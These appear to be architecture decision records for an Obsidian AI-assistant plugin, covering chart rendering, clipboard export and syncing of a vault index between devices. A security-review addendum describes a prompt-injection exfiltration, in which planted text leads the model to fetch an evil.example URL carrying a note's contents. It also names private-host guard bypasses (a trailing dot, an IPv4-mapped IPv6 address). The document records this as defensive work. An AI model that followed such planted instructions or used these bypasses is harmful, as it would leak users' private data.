...
*Previously: 2026-09-22 — ADR-208 (a mute definition has two exits: name the sense you meant, or fork a conversation about the term and distil it back into its own section of the note).*
...
**Reviewed after the fact, and it had already failed once.** `save` rebuilds the on-disk entry with `entryFromFrontmatter` before merging a fresh lookup into it, and that function read `definition` and `contexts` out of the body but not `discussion` — so every re-lookup silently deleted the section (#375). The tests above passed throughout, because they exercised `mergeEntry` with an `existing` built by hand rather than the one `save` actually produces. **A merge rule is only as good as the object it merges into**, and a test that builds that object itself is testing the rule, not the path. Two tests now run render → parse → `entryFromFrontmatter` → `mergeEntry` end to end. The same review corrected the summary's budget (700 → 1024, ADR-141's rule applied to the call that quotes it), the end a long discussion is truncated from, and an error message naming the wrong failure (#376–#378).
...
**Addendum (same day): the discussion is shown in the anchor.** Writing it and never surfacing it made the feature pay off only in the note — the reader met the term again and got the same gloss that was mute the first time. It renders under the definition, because it answers the next question rather than the first one, and **in full**: ADR-189 removed the fold from the fork and merge anchors, and the prompt contract is what keeps this short. **It is not translated**, unlike the definition: a definition arrives in whatever language the first lookup produced, which is why ADR-166 translates it for the reader, whereas a discussion is prose from a conversation the reader drove and is already in a language they chose. When that is not the language the anchor is showing, the label says so — the courtesy the meta row's `translated from DE` already pays — rather than the text changing under them. The block shares `.p-term-anchor-label` and `.p-term-anchor-body` rather than restating them (ADR-142's lesson).
...
### ADR-209 — The settings tab is organised by scope: what a conversation can override, and what it cannot
...
### ADR-210 — A chart is a fenced block Pythia draws, and a picture on the clipboard

*2026-09-23*

**Context.** Research mode (Tavily) routinely brings back numeric data: prices across vendors, figures per year, shares of a market. Until now it could only land as prose or a markdown table. A table is fine to read and poor to hand on — the user wanted to put the finding in a document, and a table pasted into Word or Google Docs is a table, not a picture of the comparison. The ask was specific: answer with a chart, and let it be copied out.

**Decision — Pythia draws the SVG itself.** Three options were weighed and two rejected on evidence rather than taste:

- **Mermaid.** Obsidian 1.13.7 bundles Mermaid 11.13.0, which does have `xychart-beta`, `pie`, `radar` and `sankey`, so "charts for free" was real. Two things sank it. Obsidian 1.13 added a **per-vault Mermaid trust guard** (`mermaid-vault-trust` in localStorage, `G1()` in app.js): until the user clicks Allow once, *every* Mermaid block renders as a security box with the source in a `<pre>`, which is a poor first meeting with a feature that is supposed to produce a picture. And `xychart-beta` has no legends, no data labels, no grouped series and no pie — so the chart types the ask actually named were not all there.
- **A charting library.** The plugin ships no UI dependency and a library solves neither the theming problem (Obsidian tokens, live theme switching) nor the export one.
- **Our own SVG**, which is what shipped: the layout is pure arithmetic with no DOM, so the things that actually go wrong — a bar escaping its plot, a pie whose arcs do not close, an axis that lies — are unit-testable.

**The block is the artifact.** A chart is a fenced ` ```pythia-chart ` block inside the assistant message's own `content`. The alternative considered was a `Message.charts` field with a `⟦chart:N⟧` marker, mirroring the proven citation design (ADR-153). It was rejected because `NoteWriter.appendConversationSlice` and `conversationArchive.archiveNoteContent` write `msg.content` verbatim: a saved conversation would have carried a dead marker and lost the data — which is half of what the user asked for. The block also gets persistence, re-render on reload, and copy for free, with no new field, no `sanitizeConversationFields` branch, and no second marker grammar.

**The chart replaces the table by default, not by decree.** "Instead of, not as well as" is the load-bearing sentence of the standing rule — left to itself a model draws the chart *and* writes the table, which doubles the answer and makes the reader check one against the other. But `CHART_WHEN_INSTRUCTION` sits **after** the conversation's own system prompt and after the user's custom instructions, so a flat "never" made it the later and more emphatic voice: a standing "always show the numbers too" had to argue with it, and so did a plain request in the chat. It now carves the user out explicitly — *if the user asks for the table as well, give them both, their request wins* — and says the rule is about duplication rather than about tables, since a table of different numbers was never the problem. A rule Pythia wrote must not outrank what the user asked for.

**Two doors, one validator.** `parseChartSpec` (`services/chartSpec.ts`) is the only place a chart is decided to be one. The model reaches it either by writing the block (the standing `CHART_WHEN_INSTRUCTION`) or by calling `render_chart`. The tool earns its place by doing the one thing the prompt cannot: returning `Error: "series[0].values" has 1 entry but "categories" has 2` so the model fixes the spec in the same turn. Every rejection names the offending field, because the string goes to the model and has to be actionable; caps are named rather than silently applied; and the spec is built fresh rather than spread, so an unknown key — a hardcoded series `color` above all — is dropped instead of reaching `Message.content`, where it would survive into a vault note and defeat the theme for good.

**Where the block goes came free.** `BaseProvider`'s `fullText` and the view's token callback consume the same stream, and `handleToolCalls` runs *between* rounds — so at the moment a tool call fires, the characters emitted so far are exactly the text before it. A counter wrapped around `appendToken` is the whole mechanism. Splicing inside `BaseProvider` was considered and rejected: it would change the loop all three providers share, for a worse position than the view can record for nothing.

**Three consequences that are easy to miss**, each tested: the commit path uses `content` (the spliced string) everywhere, or a chart renders once and vanishes from the stored message; `if (!fullText)` becomes `if (!content)`, because a turn whose only output is a chart said nothing in words and would otherwise be dropped as an empty reply; and the model comparison places charts through the same `acceptChartCall`, since one model reaching for a chart and another not is part of what a comparison is for. The title prompt deliberately keeps `fullText` — a title comes from what the answer *said*, and a chart's JSON is noise in that digest.

**It renders outside the panel too.** `main.ts` gains the plugin's first `registerMarkdownCodeBlockProcessor`. This is a real widening of the plugin's footprint — it runs on every note in the vault, not only inside Pythia's leaf — and it is taken deliberately: without it a copied block is dead text everywhere but here, and a conversation saved to a note keeps the numbers while losing the picture. `NoteWriter.appendConversationSlice` had to move its `**Pythia:**` label onto its own line for a message that opens with a fence, or the fence never opens.

**Colour, and the one exception to hard rule 3.** Axes, gridlines and labels carry classes over Obsidian tokens. A series swatch is the one thing on screen with no token to be, so `ui/chart/palette.ts` derives it — and is the single module in the plugin allowed to name a colour, with `tests/chartRules.test.ts` failing on a colour literal anywhere else under `ui/chart/`. The swatches arrive as `--p-chart-cN` custom properties on the `<svg>` root and are applied by `.p-chart-cN` rules in `styles.css`, so no colour appears in the markup and a theme change repaints the chart.

Two wrong derivations were tried first and are worth recording. **Aiming at a contrast ratio per series inverted on a dark theme**: `#1a1a1a` sits at a relative luminance of 0.010, so a swatch needs only L≈0.14 to clear 3.2:1 against it where the same ratio against white demands L≈0.28 — the dark theme ended up with the muddier colours of the two. **Ranking by HSL lightness** failed differently: luminance depends on hue as much as on lightness, so a yellow and a purple at one lightness came out 1.03:1 apart, which is to say indistinguishable. The ladder is now in WCAG's shifted luminance (`L + 0.05`), where a fixed ratio between two rungs *is* a fixed contrast between two series, and `CHART_HUES` is interleaved against it so that any two series are separated by brightness, by hue, or by both — not just consecutive ones. The floor is **3:1**, WCAG 2.2 §1.4.11, the same number and reasoning ADR-198 established for the search field's rule, recomputed by the tests from the measured grounds in `tests/fixtures/themeGrounds.ts`.

**Series 1 is deliberately not `var(--color-accent)`.** Hard rule 6 governs accent-*coloured surfaces* — a filled button, a selected segment — and a chart series is not one. The accent is user-chosen and can be any hue, so using it here would collide with whichever neighbour happened to share it, in a way neither Pythia nor the user could see coming.

**Addendum (same day): the error card's `<pre>` needed the same opt-out.** `decorateCodeBlocks`' first pass selects `pre:not([data-decorated])` across the whole subtree and only skips mermaid and plantuml ancestors — so a chart Pythia could not draw had its source block framed as a code block, labelled "code" and given a second copy button beside the one the card already offers. Marking that `<pre>` is the decorator's own documented opt-out, and the same one the card uses on its container. `tests/chartCard.test.ts` now runs the real sequence — processor draws the card, `decorateCodeBlocks` sweeps the same subtree — for both a drawn chart and a broken one.

**Responsive, not pan-scrolled — deliberately unlike ADR-004.** A diagram overflows and pans because Mermaid decided how big it is. We decide, so there is nothing to scroll: the card lays out to the width it is given and a `ResizeObserver` re-lays it out. Many categories are answered by thinning the tick labels, not by a scrollbar. The card sets `data-decorated` as its **first** act, because the processor names its container `.block-language-pythia-chart` — exactly what `decorateCodeBlocks`' diagram branch matches, where `stampSvgSize` would pin a hard pixel width and undo all of it.

**A bar chart's axis always includes zero.** A bar's length reads as its magnitude, so an axis starting at 90 turns a 2% difference into a doubling. That is not a judgement left to the model. A line chart shows change rather than magnitude and keeps its own range; a gap (`null`) breaks a line rather than being bridged, because joining across a missing year would draw a trend nobody reported.

**The PNG is the point, and one fact dictates its whole shape.** A CSS custom property does not cross the `<img>` boundary: an SVG rasterised through an `Image` is its own document, cannot see the page's stylesheet, and would export black on transparent. `inlineChartColors` clones the tree and writes resolved values in as attributes — taking each swatch straight off the root's inline style rather than through the CSSOM, so the export is right even where `getComputedStyle` is not. Three residues, each deliberate: the font is rewritten to a generic system stack, because that isolated document loads no theme webfont and hard rule 2 forbids embedding one (recorded as D-47); a background is painted in, because transparency looks right on a white page and unreadable on a dark slide; and `blob:` is used over `data:` to avoid base64 inflation and percent-encoding bugs with the umlauts and em-dashes that appear in real labels.

**`ClipboardItem` is handed the blob unresolved.** Safari requires `clipboard.write` to be reached inside the user gesture that started it, and awaiting the rasterisation first spends that gesture — the write then fails on iOS alone, which is the worst kind of bug to find. The text fallback is not optional and is not hidden on mobile: a control that quietly does nothing is worse than one that says what it did instead.

**One clipboard helper, at last.** `copyWithFeedback` sat private inside `ui/CodeBlockDecorator.ts` while CLAUDE.md described it as the shared button, and four other surfaces hand-rolled their own. A second flavour of an already-quintuplicated helper is how the sixth copy gets written, so it moved to `ui/clipboard.ts`; the code blocks now use it, and the remaining four are named in a guard list that may only shrink.

**Structure.** `sidebar.ts` sat at exactly its grandfathered ceiling of 1716 lines, so this work could not add a line to it. The `onToolCall` closure became `ui/ToolCallController.ts` — a pure refactor in its own commit — taking 120 lines with it, and the controller also took the stream counter that tells a chart where it belongs, since "where we are in the answer" and "what the call left behind" are one responsibility. The feature then spent 7 lines back on the commit path, so the ceiling is set once against the finished state at 1603: a ceiling lowered halfway through a change and breached by the rest of it guards nothing.

**Guards.** `tests/chartSpec.test.ts` (36) and `tests/chartSplice.test.ts` (11) on the boundary and the placement; `tests/chartLayout.test.ts` (43) on the geometry; `tests/chartPalette.test.ts` (24), which recomputes contrast from the measured grounds so weakening a swatch fails; `tests/chartCard.test.ts` (15) and `tests/chartExport.test.ts` (9); `tests/chartSend.test.ts` (8) on the splice through the real view; and `tests/chartRules.test.ts` (17), which fails in the forbidden direction on a colour literal outside `palette.ts`, a `createEl("svg")` that would render nothing, a sixth hand-rolled clipboard copy, and an awaited blob.
...
**Addendum — review fixes (2026-09-25).** A four-ring review of the change found one high, two medium and three low findings. All six are fixed:

1. **`read_url` could be used to exfiltrate data (high).** A page the model had read, a search snippet or an attached note could tell it to read `https://evil.example/log?d=<the note>`. Tavily would fetch that URL and the attacker's server would log the query string. Before this ADR, nothing outbound went anywhere but Tavily; `read_url` made the destination the model's choice. **`read_url` now reads only a link Pythia can vouch for, exactly as written** (`WebReadScope`, `services/webReadScope.ts`): a link in a user message of this conversation, or one a `web_search` / `read_url` result returned during this answer. The match is exact after normalisation (parsed, fragment dropped, trailing punctuation cut), so a URL the model extends with data is not on the list. That is the whole defence. **An attached note is not a source.** A note is the content an exfiltration would carry, and a link written into it cannot be told apart from one planted there; that was the user's decision. The guard **fails closed**: `ToolHandler.execute` refuses `read_url` without a scope, so a new caller cannot leave it open. The send path and each comparison candidate build their own scope. *What remains:* a planted page could list several static links and have the model choose among them, leaking a few bits per read. The per-answer cap below keeps that to a handful.
2. **A URL carrying `user:password@` was forwarded (medium).** It is now refused, without echoing the credential into the error. It is refused rather than stripped, because the page behind it is one the user reaches as themselves.
3. **The private-host guard could be bypassed (medium-low)** by a trailing dot (`localhost.`, `nas.local.`) and by an IPv4-mapped IPv6 address (`[::ffff:127.0.0.1]`, which the URL parser writes as `[::ffff:7f00:1]`). The trailing dot is now stripped, and a mapped address is judged as the IPv4 address it maps to (`isPrivateIPv4`, one list of ranges).
4. **The auto-arm composition had no test.** `wantsWeb(text, year)` moved into `services/sendPolicy.ts`, and the view calls it.
5. **Page reads per answer are capped at 5** (`MAX_READS_PER_TURN`). An admitted read counts whether or not the page loads; a refused one costs nothing. Without the cap, 25 tool rounds × 8 000 chars could put about 200 000 chars into one answer.
6. **One site is named, several are counted** in the filter description (`excluding ecb.europa.eu`, `excluding 3 sites`), so no locale needs a singular form. Before, the chip read `excluding 2`.
...
### ADR-221 — A desktop keeps the vault index; a phone holds it

**Status:** Active · 2026-09-26

**Context.** ADR-220 took the note being written out of the index. Two gaps were left behind it, both found while scoping D-61.

1. **Nothing caught up on what changed while Pythia was closed.** The watcher sees only events while Pythia runs, and `decideBuild` never rescans a complete index. A note edited on the phone, a note iCloud delivered before launch, or a note deleted elsewhere kept its old vectors until it was edited on this device. A desktop on a Worker backend caught up by accident: its first send of a session ran a full incremental sync. A desktop on the UI-thread fallback served the file as it was, and D-38 says the reporter's M2 Air runs exactly that.
2. **Both devices rewrote one synced file.** Each loads the index once per session and writes the whole of it. The phone's write of its edit was then overwritten by the desktop's next write from its older in-memory copy, and the other way round: the last writer won, and each write was the ~19 MB file the phone can least afford.

**Decision.**
- **A desktop catches up once per launch** (`services/embedding/vaultCatchUp.ts`, `catchUpIndex`; `VaultRagService.catchUp`; `EmbeddingHub.catchUpVaultIndex`). It starts `CATCH_UP_DELAY_MS` (10 s) after the workspace is up, and only where an index file exists: starting one nobody asked for is not a catch-up. It reads the index **without making it queryable** (`VaultIndexService.loadPersisted`). If the index is complete under today's scope, it runs the incremental sync, which leaves it ready. An unfinished index marked ready here would have stopped the next send from resuming its build; review caught that before commit. Every in-scope note is read and hashed, only the ones whose content moved are embedded, deleted ones drop out, and the file is written only if something changed. When nothing did, the model is never loaded. It runs at the UI-thread cadence whatever the backend (`CATCH_UP_THROTTLE`), because nothing is waiting on it. An incomplete or re-scoped index is left to a full build. It obeys an automatic build's brakes (`shouldCatchUp` in `buildDecision.ts`): never on a phone, never twice a session, never during a build, never past the crash-loop pause, never after a failed load. It runs under the build guard, and out of memory keeps its marker, as in ADR-199. It is silent: the provider is made with `silent`, and the status line shows it as a build.
- **The index records its keeper** (`IndexMeta.keeper`: `"desktop" | "mobile"`, validated by `readKeeper`). Every write signs it with the writing device's kind (`VaultIndexService` option `device`). The field is optional and needs no format version: a file without it reads as "unknown", which is the behaviour before this ADR.
- **A phone does not rewrite a desktop's index** (`VaultIndexService.writesEdits`). It still applies its own edits **in memory**, so its answers see them for the rest of the session, but it writes nothing. The desktop re-embeds those notes when their change reaches it: through the watcher while it runs, or through the catch-up at its next launch. A phone keeps writing an index it built itself, or one nobody signed. A full build on a phone (a rebuild, a scope change) signs the file `mobile` until the desktop writes it again.

**Why not the D-61 shape (a phone that embeds nothing).** It would have made a phone's answers blind to what was just written on it until the desktop ran. Embedding in memory costs one note on leaving it (ADR-220). The whole-file write was the expensive half, and that is what goes.

**What it costs.** A phone's in-memory edits are gone at its next launch. Until the desktop has caught up and synced the file back, those notes answer from their previous vectors. A phone still sees the desktop's newer file only at its next launch, as before: it reads the index once per session.

**Tests.** `tests/vaultCatchUp.test.ts`: only the changed note is embedded; a note deleted elsewhere drops; nothing changed means no model use and no write; an unfinished or re-scoped index is left alone, the guard untouched, and the index **not** marked ready; the guard brackets the sync; an ordinary failure closes it and out of memory does not; `VaultRagService.catchUp` embeds what changed before anyone asks, leaves the index ready, runs once a session, and never runs on a phone. `tests/buildDecision.test.ts`: `shouldCatchUp` as a table. `tests/VaultIndexService.test.ts`: every write is signed; a phone on a desktop's index applies an edit in memory (retrieval finds it) and writes nothing, not even at unload; a phone writes an index it signed or one nobody signed; a desktop writes whoever signed. `tests/embeddingIndex.test.ts`: the keeper round-trips through `deserializeIndex` and `peekIndexMeta`, a file without one reads as unknown, and a forged value is dropped. `tests/embeddingHub.test.ts`: the catch-up never runs on a phone (not even the store read), never on a vault with no index, and shows no first-run notice. Removing the phone rule or the mobile guard fails these tests (checked by hand).

**Also.** The scope signature moved to `indexScope.ts` as the pure `scopeSignature(settings, family)`. It is a rule, and `VaultRagService` needed the lines to stay under its 600-line budget.

**Addendum — the phone can see, and end, a desktop's keeping (2026-09-26).** The ADR left one case silent: a phone whose index is signed by a desktop that is no longer used. The phone never writes its edits, so its index stays at the desktop's last state, and nothing said so.
- **The status row says it** (`isKeptByDesktop`, `describeVaultIndexStatus`). On a phone, a ready, partial or outdated index signed `desktop` adds a note to the detail line: kept by your desktop, last written `<date>`; edits made here reach it when the desktop runs; if that desktop is no longer used, Build now takes the index over. The date is `formatDate` of the new header field **`writtenAt`** (epoch ms, stamped on every write with the keeper, validated by `readWrittenAt`). A file without it gets the same note without the date.
- **Build now is live for it** (`buildNowEnabled`). "Ready" alone greys the button out.
- **Build now actually takes over.** Two things stood in the way, both found while wiring the hint. First, on a UI-thread backend, a refresh hydrated a complete index and returned without syncing, even when forced, so Build now on a phone did nothing. It now returns only when not forced; the only forced callers are Build now and Rebuild, and Rebuild has already cleared the index by then. Second, a full sync that changed nothing wrote nothing, so the file stayed signed `desktop`. A sync now also writes when the file was signed by the other kind of device. That is how a device takes an index over (a phone's Build now, a desktop's catch-up); an unchanged index it already signed still writes nothing.
...
### ADR-222 — The vault index keeps a journal of its edits

**Status:** Active · 2026-09-26

**Context.** D-35: the index was one serialized array, so every write rewrote all of it, about 19 MB at the 5 000-note cap. ADR-220 spaced edit writes 30 s apart and ADR-221 took the phone out of writing. The size of each write stayed the same, and so did the cost of every one of them: a 19 MB allocation, a 19 MB write and a 19 MB sync event on every device, for one edited note. It was also the precondition for moving the engine into Schreibstube.
...
**What stays.** The 30 s write window from ADR-220 stays, now mostly to save sync events rather than memory. A build still writes the whole base as it goes (ADR-182). Builds are rare, and a base is what they produce.
